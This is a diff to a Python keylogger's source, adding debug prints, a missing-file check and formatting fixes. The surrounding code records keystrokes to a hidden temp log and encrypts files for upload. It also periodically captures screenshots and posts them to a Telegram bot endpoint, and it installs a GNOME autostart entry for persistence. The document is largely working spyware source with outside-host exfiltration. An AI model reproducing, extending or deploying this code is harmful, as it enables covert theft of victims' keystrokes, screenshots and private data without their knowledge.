@@ -46,6 +46,7 @@ class Keylogger:
     def __init__(self) -> None:
         self.duplicate = ['']
         self.filename = join(gettempdir(), f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
+        print(f"Log file path: {self.filename}")  # Debug: Print log file path
 
     def savefile(self, data: str) -> None:
         try:
@@ -77,6 +78,7 @@ class Keylogger:
 
                 # Log the Keystrokes
                 self.savefile(f'{key}\n')
+                print(f"Key pressed: {key}")  # Debug: Print the key pressed
 
             except Exception as e:
                 alarm(f'Error: {e}')
@@ -99,6 +101,10 @@ class Uploader:
 
     def encrypt_file(self, filename: str) -> None:
         try:
+            if not exists(filename):
+                print(f"Error: File {filename} does not exist.")  # Debug: Print error if file is missing
+                return
+
             with open(filename, 'rb') as f:
                 data = f.read()
             encrypted_data = cipher_suite.encrypt(data)
@@ -133,7 +139,6 @@ class Uploader:
         pass
 
 # Take screenshots periodically
-
 class ScreenshotCapture:
     def __init__(self) -> None:
         pass
@@ -147,7 +152,7 @@ class ScreenshotCapture:
             # Send the screenshot to Telegram
             with open(screenshot_filename, "rb") as fh:
                 files = {"document": fh}
-                resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}",files=files,)
+                resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}", files=files)
 
                 if resp.status_code != 200:
                     alarm(f"Screenshot Error Code: {resp.status_code}")
@@ -159,7 +164,6 @@ class ScreenshotCapture:
         while True:
             self.take_screenshot()
             sleep(SCREENSHOT_INTERVAL)
-
 
     def __del__(self) -> None:
         pass
@@ -199,13 +203,13 @@ def add_to_startup() -> None:
             if not exists(desktop_file_path):
                 with open(desktop_file_path, 'w') as f:
                     f.write(f"""[Desktop Entry]
-                    Type=Application
-                    Exec=python3 {script_path}
-                    Hidden=false
-                    X-GNOME-Autostart-enabled=true
-                    Name=Keylogger
-                    Comment=Start Keylogger on login
-                    """)
+Type=Application
+Exec=python3 {script_path}
+Hidden=false
+X-GNOME-Autostart-enabled=true
+Name=Keylogger
+Comment=Start Keylogger on login
+""")
 
     except Exception as e:
         alarm(f'Persistence Error: {e}')
